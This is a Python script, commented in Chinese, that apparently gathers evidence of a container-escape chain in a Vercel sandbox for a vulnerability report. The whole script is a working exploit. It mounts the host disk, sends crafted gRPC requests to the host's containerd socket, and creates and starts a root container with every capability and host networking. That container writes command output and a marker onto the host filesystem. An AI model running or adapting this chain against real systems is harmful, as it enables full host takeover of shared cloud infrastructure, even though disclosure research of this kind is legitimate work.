# -*- coding: utf-8 -*-
"""vda43_chain_evidence: v38 RCE 链完整证据收集 (为报告服务)
v38 已验证: mount /dev/vda -> 宿主 containerd.sock -> Create+Start 新容器 -> RCE
v43 补充证据:
P1: Containers/List + Containers/Get(sandbox-controller) -> 读完整 spec
P2: 创建 v43pwn (spec: 无 network namespace, 全 caps, 无 seccomp)
P3: Tasks/Create + Start (命令输出写宿主盘 /mnt/root/.v43_out.txt)
P4: 验证: marker + 读回容器执行输出 (网络/路由/caps/宿主文件)
输出落盘 + 哨兵 V43S_DONE"""
import os, time, socket, ctypes, re, struct, subprocess, json, base64

OUT = '/vercel/sandbox/v43s.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, ctype='application/grpc', t=6, ns='default'):
    try:
        tmp = '/vercel/sandbox/curl_req_%d.bin' % os.getpid()
        hdr = '/vercel/sandbox/curl_hdr_%d.txt' % os.getpid()
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: %s' % ctype, '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 2)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' | ')[:300]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload


def show(tag, out, raw=False, maxlen=600):
    if not out:
        log('%s -> EMPTY' % tag)
        return
    if raw:
        log('%s -> %s' % (tag, out[:maxlen].decode('utf-8', errors='replace').replace('\n', ' ')))
        return
    strs = re.findall(rb'[\x20-\x7e]{4,}', out)
    log('%s -> %s' % (tag, [s.decode(errors='replace') for s in strs[:20]]))


CSP = '/mnt/vdax/run/containerd/containerd.sock'
IMAGE = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
CID = 'v43pwn'


def p1():
    log('=== P1 list + get ===')
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    log('Containers/List %s' % rc)
    m = re.search(rb'\$([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', out)
    ctrl = m.group(1).decode() if m else None
    log('ctrl container id = %s' % ctrl)
    # Containers/Get
    if ctrl:
        rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Get', grpc_env(pstr(1, ctrl)), t=4)
        log('Containers/Get %s' % rc)
        show('Get body', out)
        # 提取 spec 中的关键字段: env / mounts / caps
        if b'CONTAINER_ROOTFS_SOURCE' in out:
            log('*** Get returns full spec (env present) ***')
    # Snapshots/List (观察层)
    rc, out = curl_h2(CSP, '/containerd.services.snapshots.v1.Snapshots/List', grpc_env(b''), t=4)
    log('Snapshots/List %s' % rc)
    show('Snap body', out, maxlen=400)
    return ctrl


def make_spec(args):
    caps = ["CAP_AUDIT_CONTROL", "CAP_AUDIT_READ", "CAP_AUDIT_WRITE", "CAP_BLOCK_SUSPEND", "CAP_BPF",
            "CAP_CHECKPOINT_RESTORE", "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
            "CAP_FSETID", "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_KILL", "CAP_LEASE", "CAP_LINUX_IMMUTABLE",
            "CAP_MAC_ADMIN", "CAP_MAC_OVERRIDE", "CAP_MKNOD", "CAP_NET_ADMIN", "CAP_NET_BIND_SERVICE",
            "CAP_NET_BROADCAST", "CAP_NET_RAW", "CAP_PERFMON", "CAP_SETFCAP", "CAP_SETGID", "CAP_SETPCAP",
            "CAP_SETUID", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_CHROOT", "CAP_SYS_MODULE", "CAP_SYS_NICE",
            "CAP_SYS_PACCT", "CAP_SYS_PTRACE", "CAP_SYS_RAWIO", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
            "CAP_SYS_TTY_CONFIG", "CAP_SYSLOG", "CAP_WAKE_ALARM"]
    return {
        "ociVersion": "1.0.2",
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": args,
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                    "V43_PWNED=1"],
            "cwd": "/",
            "capabilities": {
                "bounding": caps, "effective": caps, "permitted": caps, "ambient": caps
            }
        },
        "root": {"path": "rootfs"},
        "mounts": [
            {"destination": "/proc", "type": "proc", "source": "proc"},
            {"destination": "/dev", "type": "bind", "source": "/dev", "options": ["rbind", "rw"]},
            {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["rbind", "ro"]},
            {"destination": "/usr", "type": "bind", "source": "/usr", "options": ["rbind", "ro"]},
            {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["rbind", "ro"]},
            {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["rbind", "ro"]},
            {"destination": "/etc", "type": "bind", "source": "/etc", "options": ["rbind", "ro"]}
        ],
        "linux": {
            "resources": {"devices": [{"allow": True, "access": "rwm"}]},
            "cgroupsPath": "/v43pwn-ctr",
            "namespaces": [
                # 注意: 只隔离 mount/pid/uts/ipc, 不隔离 network -> 共享宿主网络命名空间
                {"type": "mount"}, {"type": "pid"}, {"type": "uts"}, {"type": "ipc"}
            ]
        }
    }


def p2():
    log('=== P2 Create v43pwn ===')
    # 容器内执行证据收集, 输出写宿主盘 /mnt/root/.v43_out.txt (通过 mount /dev/vda)
    # 注意: 必须先 mount, 再对 /mnt/root 做重定向 (重定向发生在命令块执行前)
    inner = (
        'mkdir -p /mnt; mount /dev/vda /mnt 2>&1; '
        '{ '
        'echo "=== ip addr ==="; ip addr 2>&1 | head -25; '
        'echo "=== ip route ==="; ip route 2>&1; '
        'echo "=== caps ==="; grep -E "Cap(Eff|Bnd|Prm)" /proc/self/status; '
        'echo "=== seccomp ==="; grep Seccomp /proc/self/status; '
        'echo "=== pid1 ==="; cat /proc/1/cmdline 2>&1; echo; '
        'echo "=== netns inode ==="; readlink /proc/self/ns/net 2>&1; '
        'echo "=== sandbox netns ==="; ls -la /proc/*/ns/net 2>/dev/null | head -5; '
        'ls /mnt/ 2>&1 | head -15; '
        'echo "=== hostname ==="; cat /etc/hostname 2>&1; '
        'echo "=== V43_OUT_DONE ==="; '
        '} > /mnt/root/.v43_out.txt 2>&1; '
        'echo v43-pwned $(date) >> /mnt/root/.v43_marker 2>&1; '
        'cat /mnt/root/.v43_marker 2>&1; '
        'sleep 60'
    )
    spec = make_spec(["/bin/sh", "-c", inner])
    spec_json = json.dumps(spec).encode()
    runtime = pstr(1, 'io.containerd.runc.v2')
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, spec_json)
    ctr = pstr(1, CID) + pstr(3, IMAGE) + pmsg(4, runtime) + pmsg(5, any_spec)
    ctr += pstr(6, 'overlayfs')
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Create', grpc_env(pmsg(1, ctr)), t=6)
    log('Containers/Create %s' % rc)
    if 'grpc-status: 0' not in rc:
        return False
    req = pstr(1, CID)
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(req), t=8)
    log('Tasks/Create %s' % rc)
    if 'grpc-status: 0' not in rc:
        return False
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(req), t=8)
    log('Tasks/Start %s' % rc)
    return 'grpc-status: 0' in rc


def p3():
    log('=== P3 verify ===')
    # 等待容器内命令执行
    time.sleep(8)
    try:
        mk = '/mnt/vdax/root/.v43_marker'
        log('marker: %s' % (os.path.exists(mk) and open(mk).read().strip() or 'MISSING'))
        out = '/mnt/vdax/root/.v43_out.txt'
        if os.path.exists(out):
            content = open(out, encoding='utf-8', errors='replace').read()
            log('--- container output (first 2500) ---')
            for ln in content.splitlines():
                log('| %s' % ln[:250])
            log('--- end ---')
        else:
            log('v43_out.txt MISSING')
    except Exception as e:
        log('verify ERR %s' % e)
    # Tasks/List
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/List', grpc_env(b''), t=4)
    log('Tasks/List %s' % rc)
    if b'v43pwn' in out:
        log('*** V43PWN TASK RUNNING ***')
    # init.pid
    try:
        fp = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/v43pwn/init.pid'
        if os.path.exists(fp):
            log('init.pid: %s' % open(fp).read().strip())
    except Exception as e:
        log('pid ERR %s' % e)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    ctrl = p1()
    ok = p2()
    if ok:
        p3()
    else:
        log('v43pwn create failed, skip')

    log('V43S_DONE')
    f.close()


if __name__ == '__main__':
    main()
